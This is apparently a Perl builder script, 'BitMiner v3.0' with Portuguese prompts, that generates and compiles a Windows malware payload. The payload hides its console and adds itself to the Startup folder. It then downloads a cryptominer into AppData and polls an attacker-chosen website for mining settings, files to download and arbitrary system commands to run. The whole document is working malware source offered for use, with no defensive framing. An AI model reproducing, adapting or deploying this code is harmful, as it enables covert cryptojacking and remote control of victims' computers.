#!/usr/bin/perl -w
use Term::ANSIColor qw[color];
use Archive::Zip;
use LWP::Simple qw[getstore];
use Config;

$SIG{INT} = sub {sleep 3 and exit 0};
if($Config{osname} =~ m/win/i){
  system("cls");
}else{
  system("clear");
}

print color("RED");
print <<"ART";
\n/\\
||_____-----_____-----_____
||   O                  O  \\
||    O\\\\    ___    //O    /
||       \\\\ /   \\//        \\
||         |_O O_|         /        Valeu, Nyx !
||          ^ | ^          \\
||        // UUU \\\\        /
||    O//            \\\\O   \\
||   O                  O  /
||_____-----_____-----_____\\
||
ART
print color("reset");
print "\n\tBitMiner v3.0\n";

if(@ARGV){
  if(@ARGV > 1){
    print "\n[", color("YELLOW"),"!",color("reset"), "] Somente um parametro por vez permitido !\n";
    sleep 3;
    exit 0;
  }
  foreach(@ARGV){
    if($_ =~ m/--install-compiler/){
      my $zip = undef;
      print "\n[", color("YELLOW"),"!",color("reset"), "] Baixando o compilador", color("RED"),"...",color("reset"), "\n";
      getstore("http://indigostar.com/download/perl2exe-24.00-win.zip", "perl2exe.zip");
      $zip = Archive::Zip->new;
      $zip->read("perl2exe.zip");
      $zip->extractTree();
      unlink "perl2exe.zip";
      rename "perl2exe-24.00-win", "perl2exe";
      print "\n[", color("YELLOW"),"!",color("reset"), "] Sucesso !\n";
      sleep 3;
      exit 0;
    }
    else{
      print "\n[", color("YELLOW"),"!",color("reset"), "] Parametro invalido !\n";
    }
  }
}else{
  print "\n[", color("YELLOW"),"!",color("reset"), "] Digite seu site: ";
  my $www = <STDIN>;
  chomp $www if $www;
  until($www){
    print "[", color("YELLOW"),"!",color("reset"), "] Digite seu site: ";
    $www = <STDIN>;
    chomp $www if $www;
  }
  &generate($www);
}

sub generate{
  if(! -e "perl2exe"){
    print "\n[", color("YELLOW"),"!",color("reset"), "] Nenhum compilador encontrado, execute $0 --install-compiler !\n";
    sleep 3;
    exit 0;   
  }
  unless($_[0]){
    print "\n[", color("YELLOW"),"!",color("reset"), "] Ocorreu um erro, tente novamente !\n";
    sleep 3;
    exit 0;
  }
  print "\n";
  $_[0] = "http://" . $_[0] if $_[0] !~ m/^(http|https):\/\//;
  $_[0] =~ s/\/$//;
  open(OUTPUT, ">", "output.pl");
  print OUTPUT <<EXE;
#!/usr/bin/perl -w
#perl2exe_include Win32::HideConsole
#perl2exe_include LWP::UserAgent
#perl2exe_include LWP::Simple
#perl2exe_include Config
#perl2exe_include Cwd

\$SIG{INT} = 'IGNORE';
BEGIN {
  use Win32::HideConsole qw[hide_console];
  hide_console;
}

use LWP::UserAgent qw[get agent decoded_content];
use LWP::Simple qw[getstore];
use Config;
use Cwd;  
my \$disk = getcwd;
if(\$disk =~ m/(.+):\\/(.+)/){\$disk = \$1;}
my \$ua = LWP::UserAgent->new;
\$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
while(1){
  if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
    system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
  }
  while(! -e \"\$disk:\\\\Users\\\\\$ENV{USERNAME}\\\\AppData\\\\Roaming\\\\NsCpuCNMiner.exe\"){
    if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
    }else{
      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
    }
    if(-e \"NsCpuCNMiner.exe\"){
      system(\"move NsCpuCNMiner.exe %AppData%\");
    }else{
      next;
    }
  }
  my \$response = \$ua->get(\"$_[0]\");
  if(\$response->decoded_content =~ m/miner->host:(.+);email:(.+);|miner->host:(.+),email:(.+);/){
    system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
  }
  if(\$response->decoded_content =~ m/download:(.+),(.+);/){
    getstore(\"\$1\", \"\$2\");
  }
  if(\$response->decoded_content =~ m/system:(.+);/){
    system(\"\$1\");
  }
}
EXE
  close(OUTPUT);
  if($^V =~ m/5.24.1/){
    system("perl2exe\\perl2exe.exe -platform=Win32-5.24.1 -o output_32.exe output.pl");  
    if(-e "output_32.exe"){
      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
    }else{
      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
    }
    system("perl2exe\\perl2exe.exe -platform=Win64-5.24.1 -o output_64.exe output.pl");
    if(-e "output_64.exe"){
      print "\nExecutavel de 64 bits gerado com sucesso !\n";
    }else{
      print "\nExecutavel de 64 bits nao foi gerado !\n";
    }
  }
  elsif($^V =~ m/5.24.0/){
    system("perl2exe\\perl2exe.exe -platform=Win32-5.24.0 -o output_32.exe output.pl");
    if(-e "output_32.exe"){
      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
    }else{
      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
    }
    system("perl2exe\\perl2exe.exe -platform=Win64-5.24.0 -o output_64.exe output.pl");
    if(-e "output_64.exe"){
      print "\nExecutavel de 64 bits gerado com sucesso !\n";
    }else{
      print "\nExecutavel de 64 bits nao foi gerado !\n";
    }
  }
  else{
    print "\n[", color("YELLOW"),"!",color("reset"), "] Somente as versoes 5.24.1 e 5.24.0 sao suportadas !\n";
  }
  unlink "output.pl";
  sleep 3;
}
